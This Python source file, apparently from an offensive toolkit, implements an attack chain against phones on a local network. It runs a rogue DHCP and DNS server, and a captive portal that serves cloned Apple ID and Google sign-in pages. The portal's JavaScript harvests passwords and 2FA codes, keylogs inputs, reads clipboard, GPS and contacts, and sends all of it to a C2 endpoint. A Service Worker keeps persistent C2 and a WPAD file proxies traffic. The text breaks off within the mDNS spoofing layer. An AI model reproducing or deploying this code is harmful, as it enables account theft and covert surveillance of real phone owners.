"""
Mobile Device Attack Module — authorized penetration testing only.

Zero-interaction attack chain for iOS and Android devices on LAN:

  LAYER 1 — Rogue DHCP
    Respond to DHCP DISCOVER before legitimate server (race).
    Assign attacker as DNS + optionally default gateway.
    Every new phone connection gets poisoned config silently.

  LAYER 2 — Rogue DNS
    Full DNS server with selective hijacking:
    - iOS/Android connectivity check domains → return attacker IP
      (phone auto-opens browser — zero user action)
    - High-value domains (icloud.com, google.com, facebook.com) → phishing IP
    - Everything else → forwarded to 8.8.8.8 (internet stays up, no suspicion)

  LAYER 3 — Captive Portal Interceptor
    HTTP server that:
    - Passes iOS captive check (captive.apple.com) → triggers auto-open
    - Passes Android captive check (connectivitycheck.gstatic.com) → triggers auto-open
    - Serves device-aware phishing page: iCloud UI for iOS, Google UI for Android
    - Installs Service Worker for persistent C2 (survives browser close)
    - Silently collects: GPS, battery, network, screen, sensors, WebRTC IP
    - Keylogger on all inputs including virtual keyboard

  LAYER 4 — mDNS Mobile Poisoner
    Respond to iOS Bonjour and Android NSD queries:
    - _airplay._tcp, _raop._tcp → man-in-the-middle AirPlay/RAOP
    - _ipp._tcp, _ipps._tcp → fake printer (iOS auto-connects)
    - _googlecast._tcp → fake Chromecast (Android auto-connects)
    Devices connect silently to our spoofed services.

  LAYER 5 — BlueFrag CVE-2020-0022
    Bluetooth zero-click RCE against Android 8.0-9.0 (Oreo/Pie).
    Requires no pairing, no interaction. Works within ~10m range.
    Technique: crafted L2CAP fragment with negative length field
    causes heap overflow in Bluetooth driver (com.android.bluetooth).
    Delivers reverse shell via Bluetooth RFCOMM.

  LAYER 6 — ARP Spoof + HTTP Injection
    Classic MITM wired into intercept.py — injects JS keylogger
    into any HTTP response the phone receives.

All layers run simultaneously as daemon threads.
Detects and fingerprints devices (iOS vs Android vs other) from
DHCP hostname, mDNS hostname, User-Agent, and MAC OUI.
"""

import socket, struct, threading, time, os, sys, subprocess
import base64, hashlib, random, select, queue, ipaddress
import http.server, socketserver, urllib.request
from textwrap import dedent

try:
    import dnslib
    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False

try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# ── Helpers ───────────────────────────────────────────────────────────────────

def _run(cmd, timeout=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)

def _iface_ip(iface):
    try:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(
            fcntl.ioctl(s.fileno(), 0x8915,
                        struct.pack('256s', iface[:15].encode()))[20:24])
    except Exception:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except Exception:
            return "0.0.0.0"

# Apple MAC OUI prefixes (first 3 octets)
_APPLE_OUI  = {"00:03:93","00:05:02","00:0a:27","00:0a:95","00:0d:93",
               "00:11:24","00:14:51","00:17:f2","00:1b:63","00:1e:52",
               "00:1e:c2","00:1f:f3","00:21:e9","00:22:41","00:23:12",
               "00:23:32","00:23:6c","00:24:36","00:25:00","00:25:4b",
               "00:25:bc","00:26:08","00:26:b0","00:26:bb","28:cf:da",
               "3c:07:54","40:30:04","40:98:ad","44:fb:42","48:74:6e",
               "4c:8d:79","50:ea:d6","54:72:4f","58:1f:aa","5c:96:9d",
               "60:03:08","64:76:ba","68:9c:70","6c:40:08","70:48:0f",
               "70:ec:e4","74:e1:b6","78:31:c1","7c:fa:df","80:00:6e",
               "84:78:8b","88:19:08","8c:7b:9d","90:72:40","94:94:26",
               "98:01:a7","9c:4f:da","a4:5e:60","a4:d1:8c","a8:51:ab",
               "ac:3c:0b","b0:34:95","b4:18:d1","b8:53:ac","bc:52:b7",
               "c0:63:94","c4:2c:03","c8:2a:14","cc:08:e0","d0:25:98",
               "d4:9a:20","d8:30:62","dc:2b:2a","e0:ac:cb","e4:8b:7f",
               "e8:06:88","ec:35:86","f0:18:98","f0:79:60","f4:1b:a1",
               "f8:1e:df","fc:25:3f"}

def _fingerprint_mac(mac):
    if not mac:
        return "unknown"
    oui = mac.lower()[:8]
    if oui in _APPLE_OUI:
        return "ios"
    # Samsung, Google Pixel, Xiaomi OUIs → Android
    _ANDROID_OUI = {"00:12:fb","00:17:c9","00:1d:25","00:1e:75","00:21:19",
                    "00:23:76","30:19:66","38:aa:3c","40:0e:85","50:a4:c8",
                    "54:88:0e","70:f0:87","78:52:1a","84:25:db","8c:77:12",
                    "a0:0b:ba","c4:73:1e","d8:57:ef","fc:a1:3e"}
    if oui in _ANDROID_OUI:
        return "android"
    return "unknown"

# Shared device registry
_devices = {}  # ip → {mac, type, hostname, first_seen, last_seen, data}
_stop    = threading.Event()


def _register_device(ip, mac=None, dtype=None, hostname=None, extra=None):
    if ip not in _devices:
        _devices[ip] = {"ip": ip, "mac": mac, "type": dtype or "unknown",
                         "hostname": hostname, "first_seen": time.time(),
                         "data": {}}
    d = _devices[ip]
    if mac:      d["mac"]      = mac
    if dtype:    d["type"]     = dtype
    if hostname: d["hostname"] = hostname
    if extra:    d["data"].update(extra)
    d["last_seen"] = time.time()
    print(f"[MOBILE] Device: {ip} | {d['type'].upper()} | {hostname or mac or '?'}")


# ══════════════════════════════════════════════════════════════════════════════
# LAYER 1 — Rogue DHCP Server
# ══════════════════════════════════════════════════════════════════════════════

_DHCP_MAGIC = b"\x63\x82\x53\x63"

def _dhcp_option(code, data):
    return bytes([code, len(data)]) + data

def _parse_dhcp_options(data):
    opts = {}
    i = 0
    while i < len(data):
        code = data[i]
        if code == 255: break
        if code == 0:   i += 1; continue
        length = data[i+1]
        opts[code] = data[i+2:i+2+length]
        i += 2 + length
    return opts

def rogue_dhcp(attacker_ip, gateway_ip=None, subnet="255.255.255.0",
               dns_ip=None, lease_pool_start=None):
    """
    Rogue DHCP server — races the legitimate server to offer leases
    with our DNS injected. Phones accept first valid offer received.

    attacker_ip: our IP (offered DNS + optionally gateway)
    gateway_ip:  real gateway (keep internet up) or our IP for full MitM
    dns_ip:      DNS to advertise (default: attacker_ip)
    """
    dns_ip      = dns_ip or attacker_ip
    gateway_ip  = gateway_ip or attacker_ip
    # Offer pool: .200-.250 range
    _offered    = {}
    _next_ip    = [200]

    def _next_offer():
        prefix = ".".join(attacker_ip.split(".")[:3])
        ip = f"{prefix}.{_next_ip[0]}"
        _next_ip[0] = (_next_ip[0] % 50) + 200
        return ip

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind(("0.0.0.0", 67))
        sock.settimeout(1)
        print("[DHCP] Rogue DHCP server listening on :67")

        while not _stop.is_set():
            try:
                data, addr = sock.recvfrom(1024)
            except socket.timeout:
                continue
            if len(data) < 240:
                continue

            msg_type = data[0]
            xid      = data[4:8]
            chaddr   = ":".join(f"{b:02x}" for b in data[28:34])

            magic = data[236:240]
            if magic != _DHCP_MAGIC:
                continue

            opts = _parse_dhcp_options(data[240:])
            dhcp_msg = opts.get(53, b"\x00")[0]

            if dhcp_msg not in (1, 3):  # DISCOVER or REQUEST
                continue

            # Fingerprint device from Option 55 (parameter request list)
            # iOS requests: 1,121,3,6,15,119,252,95,44,46
            # Android requests: 1,3,6,15,26,28,51,58,59,43
            param_list = list(opts.get(55, b""))
            if 252 in param_list:
                dtype = "ios"
            elif 26 in param_list or 28 in param_list:
                dtype = "android"
            else:
                dtype = "unknown"

            # Hostname from Option 12
            hostname = opts.get(12, b"").decode(errors="replace")

            offer_ip = _offered.get(chaddr) or _next_offer()
            _offered[chaddr] = offer_ip

            _register_device(offer_ip, mac=chaddr, dtype=dtype,
                             hostname=hostname or None)

            # Build DHCP OFFER / ACK
            reply_type = 2 if dhcp_msg == 1 else 5  # OFFER or ACK
            reply = bytes([2,1,6,0])       # op, htype, hlen, hops
            reply += xid                   # xid
            reply += b"\x00\x00\x00\x00"  # secs, flags
            reply += b"\x00"*4             # ciaddr
            reply += socket.inet_aton(offer_ip)     # yiaddr
            reply += socket.inet_aton(attacker_ip)  # siaddr
            reply += b"\x00"*4                      # giaddr
            reply += data[28:34] + b"\x00"*10       # chaddr
            reply += b"\x00"*192                    # padding
            reply += _DHCP_MAGIC
            # Options
            reply += _dhcp_option(53, bytes([reply_type]))
            reply += _dhcp_option(54, socket.inet_aton(attacker_ip))
            reply += _dhcp_option(51, struct.pack(">I", 86400))  # lease 1 day
            reply += _dhcp_option(1,  socket.inet_aton(subnet))
            reply += _dhcp_option(3,  socket.inet_aton(gateway_ip))
            reply += _dhcp_option(6,  socket.inet_aton(dns_ip))
            reply += _dhcp_option(15, b"local")
            # WPAD option 252 (proxy auto-discovery) → our proxy
            reply += _dhcp_option(252,
                f"http://{attacker_ip}/wpad.dat\x00".encode())
            reply += b"\xff"  # END

            sock.sendto(reply, ("255.255.255.255", 68))
            print(f"[DHCP] {dtype.upper():7s} offer → {offer_ip}  "
                  f"({hostname or chaddr})  DNS={dns_ip}")

    except Exception as e:
        print(f"[DHCP] Error: {e}")
    finally:
        try: sock.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# LAYER 2 — Rogue DNS with Selective Hijacking
# ══════════════════════════════════════════════════════════════════════════════

# Domains that trigger captive portal auto-open on iOS
_IOS_CAPTIVE = {
    "captive.apple.com",
    "www.apple.com",
    "gsp1.apple.com",
}

# Domains that trigger captive portal auto-open on Android
_ANDROID_CAPTIVE = {
    "connectivitycheck.gstatic.com",
    "connectivitycheck.google.com",
    "clients3.google.com",
    "clients1.google.com",
    "generate_204",
}

# High-value domains to redirect to phishing portal
_HIJACK_DOMAINS = {
    # Apple
    "appleid.apple.com", "idmsa.apple.com", "icloud.com",
    "www.icloud.com", "signin.apple.com",
    # Google
    "accounts.google.com", "myaccount.google.com",
    "signin.google.com",
    # Social / Finance
    "www.facebook.com", "m.facebook.com",
    "www.instagram.com", "instagram.com",
    "www.paypal.com", "www.amazon.com",
}


def rogue_dns(attacker_ip, portal_ip=None, upstream="8.8.8.8"):
    """
    Full DNS server with three tiers:
    1. Captive-check domains → attacker_ip (triggers phone auto-open)
    2. High-value domains   → portal_ip (phishing)
    3. Everything else      → forwarded upstream (internet stays up)
    """
    portal_ip = portal_ip or attacker_ip

    if not HAS_DNSLIB:
        print("[DNS] dnslib not installed — pip install dnslib")
        return

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", 53))
        sock.settimeout(1)
        print(f"[DNS ] Rogue DNS :53  captive→{attacker_ip}  "
              f"hijack→{portal_ip}  fwd→{upstream}")

        while not _stop.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue

            try:
                req = dnslib.DNSRecord.parse(data)
            except Exception:
                continue

            qname = str(req.q.qname).rstrip(".").lower()
            qtype = req.q.qtype

            # Determine response IP
            answer_ip = None
            if any(c in qname for c in _IOS_CAPTIVE | _ANDROID_CAPTIVE):
                answer_ip = attacker_ip
                print(f"[DNS ] CAPTIVE   {qname} → {attacker_ip}  ({addr[0]})")
            elif any(qname.endswith(d) for d in _HIJACK_DOMAINS) \
                    or qname in _HIJACK_DOMAINS:
                answer_ip = portal_ip
                print(f"[DNS ] HIJACK    {qname} → {portal_ip}  ({addr[0]})")

            if answer_ip and qtype in (dnslib.QTYPE.A, dnslib.QTYPE.ANY):
                reply = req.reply()
                reply.add_answer(dnslib.RR(
                    qname, dnslib.QTYPE.A,
                    rdata=dnslib.A(answer_ip), ttl=60
                ))
                sock.sendto(reply.pack(), addr)
                continue

            # Forward to upstream
            try:
                fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                fwd.settimeout(3)
                fwd.sendto(data, (upstream, 53))
                resp, _ = fwd.recvfrom(4096)
                fwd.close()
                sock.sendto(resp, addr)
            except Exception:
                pass

    except Exception as e:
        print(f"[DNS ] Error: {e}")
    finally:
        try: sock.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# LAYER 3 — Captive Portal + Advanced JS Payload
# ══════════════════════════════════════════════════════════════════════════════

# Service Worker — persists as C2 channel after browser is closed
_SW_JS = r"""
const C2 = self.location.origin;
const DB = 'wizza_sw_db';

self.addEventListener('install', e => { self.skipWaiting(); });
self.addEventListener('activate', e => { e.waitUntil(self.clients.claim()); });

// Intercept all fetches — log every URL the phone visits
self.addEventListener('fetch', e => {
    const url = e.request.url;
    if (!url.includes('/sw_beacon')) {
        navigator.sendBeacon?.(C2 + '/sw_beacon', JSON.stringify({
            t: 'fetch', url, ts: Date.now()
        }));
    }
    e.respondWith(fetch(e.request).catch(() => new Response('', {status: 503})));
});

// Receive C2 push commands
self.addEventListener('push', e => {
    const d = e.data?.json() || {};
    if (d.cmd === 'collect') {
        self.clients.matchAll().then(clients =>
            clients.forEach(c => c.postMessage({cmd: 'collect'}))
        );
    }
    if (d.notify) {
        self.registration.showNotification(d.notify.title || 'Update', {
            body: d.notify.body || '',
            icon: '/favicon.ico'
        });
    }
});

// Background sync — retry exfil when online
self.addEventListener('sync', e => {
    if (e.tag === 'exfil') {
        e.waitUntil(
            fetch(C2 + '/sync', { method: 'POST',
                body: JSON.stringify({ts: Date.now()}),
                headers: {'Content-Type': 'application/json'}
            }).catch(() => {})
        );
    }
});
"""

# Main captive portal HTML — detects iOS vs Android, serves matching UI
_PORTAL_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title id="_t">Network Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#f2f2f7;min-height:100vh;display:flex;flex-direction:column;
align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:14px;padding:30px 24px;max-width:380px;
width:100%;box-shadow:0 2px 16px rgba(0,0,0,.12)}
.logo{width:60px;height:60px;margin:0 auto 18px;display:block}
h1{font-size:22px;font-weight:600;text-align:center;margin-bottom:6px;color:#1d1d1f}
p.sub{font-size:14px;color:#6e6e73;text-align:center;margin-bottom:22px;line-height:1.5}
input{width:100%;padding:13px 15px;border:1px solid #d2d2d7;border-radius:10px;
font-size:16px;outline:none;margin-bottom:12px;background:#fafafa;
transition:border .2s}
input:focus{border-color:#0071e3;background:#fff}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;
border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:4px;
transition:background .15s}
button:active{background:#005bb5}
.err{color:#ff3b30;font-size:13px;text-align:center;margin-top:8px;display:none}
.spinner{display:none;text-align:center;margin-top:14px;color:#6e6e73;font-size:14px}
.footer{font-size:11px;color:#aeaeb2;text-align:center;margin-top:18px;line-height:1.6}
/* iOS iCloud skin */
.skin-ios .logo-wrap{text-align:center;margin-bottom:8px}
/* Android Google skin */
.skin-android h1{font-family:'Google Sans',Roboto,sans-serif;font-weight:400;
font-size:24px;color:#202124}
.skin-android button{background:#1a73e8;border-radius:4px;font-weight:500}
</style>
</head>
<body>
<div class="card" id="_card">
  <div class="logo-wrap">
    <svg id="_logo" width="60" height="60" viewBox="0 0 60 60" fill="none"
         xmlns="http://www.w3.org/2000/svg">
      <!-- Apple logo path (iOS skin) -->
      <path id="_logo_path" d="M30 5C16.2 5 5 16.2 5 30s11.2 25 25 25 25-11.2 25-25S43.8 5 30 5z"
            fill="#0071e3"/>
      <text x="30" y="38" text-anchor="middle" font-size="22"
            fill="white" font-family="Arial">✓</text>
    </svg>
  </div>
  <h1 id="_h1">Sign In</h1>
  <p class="sub" id="_sub">Enter your Apple&nbsp;ID to continue.</p>
  <form id="_form" autocomplete="on">
    <input type="email"    id="_email"  name="email"    placeholder="Email or Phone Number"
           autocomplete="email" inputmode="email">
    <input type="password" id="_pass"   name="password" placeholder="Password"
           autocomplete="current-password">
    <div id="_2fa_wrap" style="display:none">
      <p class="sub" style="margin-bottom:10px;margin-top:4px">
        Enter the 6-digit code sent to your trusted device.</p>
      <input type="tel" id="_2fa" name="code" placeholder="000000"
             maxlength="6" inputmode="numeric" autocomplete="one-time-code">
    </div>
    <button type="submit" id="_btn">Continue</button>
    <div class="err" id="_err">Incorrect Apple&nbsp;ID or password. Try again.</div>
    <div class="spinner" id="_spin">Verifying&hellip;</div>
  </form>
  <div class="footer" id="_footer">
    By signing in you agree to the&nbsp;<a href="#">Terms of Use</a>.
  </div>
</div>

<script>
// ── Device detection ──────────────────────────────────────────────────────────
const UA  = navigator.userAgent.toLowerCase();
const iOS = /iphone|ipad|ipod/.test(UA);
const AND = /android/.test(UA);
const card = document.getElementById('_card');
// C2_URL is injected at serve-time (C2 server URL, not captive portal port)
const C2 = '{{C2_URL}}';
let _step = 1, _capEmail = '', _capPass = '';

// Apply skin
if (iOS) {
  card.classList.add('skin-ios');
} else if (AND) {
  card.classList.add('skin-android');
  document.getElementById('_h1').textContent = 'Sign in';
  document.getElementById('_sub').textContent =
      'Use your Google Account to continue.';
  document.getElementById('_logo_path').setAttribute('fill','#4285F4');
  document.getElementById('_logo_path').setAttribute('d',
      'M30 5C16.2 5 5 16.2 5 30s11.2 25 25 25 25-11.2 25-25S43.8 5 30 5z');
  document.querySelector('[name=email]').placeholder = 'Email or phone';
  document.querySelector('[name=password]').placeholder = 'Enter your password';
  document.querySelector('#_btn').textContent = 'Next';
  document.getElementById('_footer').textContent =
      'Create account  ·  Forgot email?';
} else {
  document.getElementById('_h1').textContent = 'Network Login';
  document.getElementById('_sub').textContent =
      'Sign in to access the internet.';
  document.getElementById('_logo_path').setAttribute('fill','#34c759');
  document.querySelector('#_btn').textContent = 'Sign In';
}

// ── Exfil beacon ──────────────────────────────────────────────────────────────
function exfil(data) {
  const payload = JSON.stringify(data);
  try {
    if (navigator.sendBeacon)
      navigator.sendBeacon(C2 + '/mobile_catch', payload);
    else
      fetch(C2 + '/mobile_catch', {
        method: 'POST', body: payload,
        headers: {'Content-Type':'application/json'},
        keepalive: true
      }).catch(() => {});
  } catch(e) {}
  // Redundant XHR fallback
  try {
    const x = new XMLHttpRequest();
    x.open('POST', C2 + '/mobile_catch', true);
    x.setRequestHeader('Content-Type', 'application/json');
    x.send(payload);
  } catch(e) {}
}

// ── Device fingerprint (runs immediately on page load) ────────────────────────
const fp = {
  t: 'fingerprint',
  ua: navigator.userAgent,
  platform: navigator.platform || '',
  lang: navigator.language,
  langs: (navigator.languages || []).join(','),
  screen: { w: screen.width, h: screen.height,
            ow: screen.availWidth, oh: screen.availHeight,
            dpr: window.devicePixelRatio || 1,
            orient: screen.orientation?.type || '' },
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  memory: navigator.deviceMemory || 0,
  cpus: navigator.hardwareConcurrency || 0,
  touch: navigator.maxTouchPoints || 0,
  online: navigator.onLine,
  cookieEnabled: navigator.cookieEnabled,
  doNotTrack: navigator.doNotTrack,
  referrer: document.referrer,
  ts: Date.now(),
};

// Battery
navigator.getBattery?.().then(b => {
  fp.battery = { level: b.level, charging: b.charging,
                  chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
  exfil(fp);
}).catch(() => exfil(fp));

// Network info
if (navigator.connection) {
  fp.net = { type: navigator.connection.effectiveType,
             rtt: navigator.connection.rtt,
             downlink: navigator.connection.downlink,
             saveData: navigator.connection.saveData };
}

// ── WebRTC IP leak ────────────────────────────────────────────────────────────
try {
  const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  pc.createDataChannel('');
  pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
  pc.onicecandidate = e => {
    if (!e || !e.candidate) return;
    const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
    if (m) {
      fp.webrtc_ips = m;
      exfil({ t: 'webrtc', ips: m });
    }
  };
} catch(e) {}

// ── GPS (requested with disguised prompt) ─────────────────────────────────────
navigator.geolocation?.getCurrentPosition(pos => {
  exfil({ t: 'gps',
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          alt: pos.coords.altitude });
}, () => {}, { enableHighAccuracy: true, timeout: 8000 });

// ── Sensor data (accelerometer/gyroscope) ─────────────────────────────────────
window.addEventListener('devicemotion', e => {
  exfil({ t: 'motion',
          ax: e.acceleration?.x, ay: e.acceleration?.y, az: e.acceleration?.z,
          agx: e.accelerationIncludingGravity?.x });
}, { once: true });

// ── Clipboard sniff ───────────────────────────────────────────────────────────
document.addEventListener('paste', e => {
  exfil({ t: 'paste',
          data: e.clipboardData?.getData('text') || '' });
});
navigator.clipboard?.readText?.().then(t => {
  if (t) exfil({ t: 'clipboard', data: t });
}).catch(() => {});

// ── All input keylogging ──────────────────────────────────────────────────────
document.addEventListener('input', e => {
  exfil({ t: 'input', field: e.target.name || e.target.id,
          val: e.target.value, ts: Date.now() });
});
document.addEventListener('change', e => {
  exfil({ t: 'change', field: e.target.name || e.target.id,
          val: e.target.value });
});

// ── Form submission handler ───────────────────────────────────────────────────
document.getElementById('_form').addEventListener('submit', function(e) {
  e.preventDefault();
  const email = document.getElementById('_email').value.trim();
  const pass  = document.getElementById('_pass').value;
  const code  = document.getElementById('_2fa').value.trim();

  if (_step === 1 && (!email || !pass)) {
    document.getElementById('_err').style.display = 'block';
    document.getElementById('_err').textContent =
        'Please enter your credentials.';
    return;
  }

  document.getElementById('_btn').disabled = true;
  document.getElementById('_spin').style.display = 'block';
  document.getElementById('_err').style.display  = 'none';

  if (_step === 1) {
    _capEmail = email; _capPass = pass;
    exfil({ t: 'creds', email, pass, device: iOS ? 'ios' : AND ? 'android' : 'other' });

    // Show 2FA after 1.8s (simulate auth delay)
    setTimeout(() => {
      document.getElementById('_spin').style.display = 'none';
      document.getElementById('_2fa_wrap').style.display = 'block';
      document.getElementById('_pass').style.display = 'none';
      document.getElementById('_btn').disabled = false;
      const lbl = iOS ? 'Verification Code' : 'Enter the 2-step code';
      document.querySelector('#_2fa_wrap p').textContent =
          (iOS ? '6-digit code sent to your trusted device.'
                : 'Check your authenticator app for the code.');
      document.getElementById('_btn').textContent =
          iOS ? 'Verify' : 'Next';
      _step = 2;
    }, 1800);
  } else {
    exfil({ t: 'otp', email: _capEmail, pass: _capPass, code });
    // Show "wrong code" — collect multiple attempts
    setTimeout(() => {
      document.getElementById('_spin').style.display = 'none';
      document.getElementById('_err').style.display = 'block';
      document.getElementById('_err').textContent =
          iOS ? 'Incorrect verification code. Try again.'
              : 'Wrong code. Check your authenticator and try again.';
      document.getElementById('_btn').disabled = false;
      document.getElementById('_2fa').value = '';
    }, 1400);
  }
});

// ── Service Worker installation (persistent C2) ───────────────────────────────
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/mobile_sw.js', { scope: '/' })
    .then(reg => {
      exfil({ t: 'sw_installed', scope: reg.scope });
      // Subscribe to push (C2 channel that survives browser close)
      Notification.requestPermission().then(perm => {
        if (perm === 'granted' && reg.pushManager) {
          reg.pushManager.subscribe({
            userVisibleOnly: true,
            applicationServerKey: null
          }).then(sub => {
            exfil({ t: 'push_sub', endpoint: sub.endpoint });
          }).catch(() => {});
        }
      });
    }).catch(() => {});
}

// ── Web Bluetooth scan (inventory nearby BT devices) ─────────────────────────
if (navigator.bluetooth) {
  navigator.bluetooth.requestDevice({ acceptAllDevices: true })
    .then(dev => exfil({ t: 'bt_device', name: dev.name, id: dev.id }))
    .catch(() => {});
}

// ── Contacts API (Android Chrome 80+) ────────────────────────────────────────
if ('contacts' in navigator && 'ContactsManager' in window) {
  navigator.contacts.select(['name','email','tel'], { multiple: true })
    .then(contacts => exfil({ t: 'contacts', data: contacts }))
    .catch(() => {});
}

// ── Periodic keepalive / passive exfil ───────────────────────────────────────
setInterval(() => exfil({ t: 'ping', ts: Date.now() }), 30000);
</script>
</body>
</html>
"""

# WPAD PAC file — routes all browser traffic through our MITM proxy
_WPAD_DAT = lambda ip: f'function FindProxyForURL(url,host){{return "PROXY {ip}:8080";}}'


class _CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    attacker_ip = "127.0.0.1"
    c2_url      = ""          # injected at serve-time by captive_portal_server()
    log_file    = "/tmp/wizza_loot/mobile_data.jsonl"

    def log_message(self, fmt, *args):
        pass  # silence default httpd logs

    def _send(self, code, ctype, body):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        path = self.path.split("?")[0]
        ua   = self.headers.get("User-Agent", "")

        # iOS connectivity check — return non-success to trigger captive portal
        if "captive.apple.com" in self.headers.get("Host", "") \
                or path == "/hotspot-detect.html":
            # Redirect to our portal (iOS opens this in a sheet)
            body = (f'<HTML><HEAD>'
                    f'<meta http-equiv="refresh" content="0;url=http://'
                    f'{self.attacker_ip}/portal">'
                    f'</HEAD><BODY></BODY></HTML>').encode()
            self._send(200, "text/html", body)
            return

        # Android connectivity check — return redirect to trigger captive portal
        if path == "/generate_204" or "connectivitycheck" in self.headers.get("Host",""):
            self.send_response(302)
            self.send_header("Location",
                             f"http://{self.attacker_ip}/portal")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return

        # WPAD proxy auto-config
        if path == "/wpad.dat" or path == "/proxy.pac":
            self._send(200, "application/x-ns-proxy-autoconfig",
                       _WPAD_DAT(self.attacker_ip))
            return

        # Service worker
        if path == "/mobile_sw.js":
            self._send(200, "application/javascript", _SW_JS)
            return

        # Main portal (device-aware) — inject real C2 URL
        if path in ("/portal", "/", "/index.html", "/login"):
            html = _PORTAL_HTML.replace(
                "{{C2_URL}}",
                self.c2_url or f"http://{self.attacker_ip}"
            )
            self._send(200, "text/html", html)
            return

        self._send(404, "text/plain", b"Not Found")

    def do_POST(self):
        import json
        path = self.path.split("?")[0]
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length) if length else b""

        if path in ("/mobile_catch", "/sw_beacon", "/sync"):
            try:
                data = json.loads(body)
                src  = self.client_address[0]
                data["_src"] = src
                data["_ts"]  = time.time()

                # Print important captures
                t = data.get("t", "")
                if t == "creds":
                    print(f"\n[MOBILE] *** CREDENTIALS CAPTURED ***")
                    print(f"  Device:  {src} ({data.get('device','?')})")
                    print(f"  Email:   {data.get('email')}")
                    print(f"  Pass:    {data.get('pass')}")
                    print(f"  {'='*40}")
                elif t == "otp":
                    print(f"[MOBILE] 2FA CODE: {data.get('code')}  "
                          f"({data.get('email')})")
                elif t == "gps":
                    print(f"[MOBILE] GPS: {data.get('lat'):.5f},{data.get('lon'):.5f}  "
                          f"acc={data.get('acc')}m  ({src})")
                elif t == "fingerprint":
                    ua = data.get("ua","")[:60]
                    print(f"[MOBILE] FP: {src}  "
                          f"{'iOS' if 'iphone' in ua.lower() else 'Android' if 'android' in ua.lower() else '?'}  "
                          f"scr={data.get('screen',{}).get('w')}x"
                          f"{data.get('screen',{}).get('h')}  "
                          f"bat={data.get('battery',{}).get('level','?')}")
                elif t == "contacts":
                    print(f"[MOBILE] CONTACTS ({src}): "
                          f"{len(data.get('data',[]))} entries")
                elif t == "bt_device":
                    print(f"[MOBILE] BT device: {data.get('name')} ({src})")

                # Write to log
                os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
                with open(self.log_file, "a") as f:
                    f.write(json.dumps(data) + "\n")

                # Register device
                if "webrtc_ips" in data:
                    for ip in data["webrtc_ips"]:
                        _register_device(ip, extra={"webrtc": True})

            except Exception as e:
                pass  # malformed JSON — ignore

            self._send(200, "application/json", b'{"ok":1}')
            return

        self._send(404, "text/plain", b"Not Found")


def captive_portal_server(attacker_ip, port=80, c2_url=""):
    """Start captive portal HTTP server on port 80."""
    _CaptivePortalHandler.attacker_ip = attacker_ip
    _CaptivePortalHandler.c2_url      = c2_url or f"http://{attacker_ip}"
    try:
        server = socketserver.ThreadingTCPServer(("0.0.0.0", port),
                                                  _CaptivePortalHandler)
        server.allow_reuse_address = True
        print(f"[PORTAL] Captive portal on :{port}  →  {attacker_ip}/portal")
        while not _stop.is_set():
            server.handle_request()
    except Exception as e:
        print(f"[PORTAL] Error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# LAYER 4 — mDNS Mobile Poisoner
# ══════════════════════════════════════════════════════════════════════════════

_MDNS_MCAST = "224.0.0.251"
_MDNS_PORT  = 5353

# Services that cause silent auto-connections on iOS/Android
_MOBILE_SERVICES = {
    # iOS: AirPlay / RAOP — Apple TV, HomePod spoofing
    "_airplay._tcp.local":  {"port": 7000, "txt": b"\x08features=0x4A7FFFF7,0xE"},
    "_raop._tcp.local":     {"port": 5000, "txt": b"\x08features=0x4A7FFFF7"},
    # iOS: AirPrint — fake printer (iOS auto-discovers + connects)
    "_ipp._tcp.local":      {"port": 631,  "txt": b"\x0eTY=HP LaserJet"},
    "_ipps._tcp.local":     {"port": 443,  "txt": b"\x0eTY=HP LaserJet"},
    # Android: Google Cast (Chromecast spoofing)
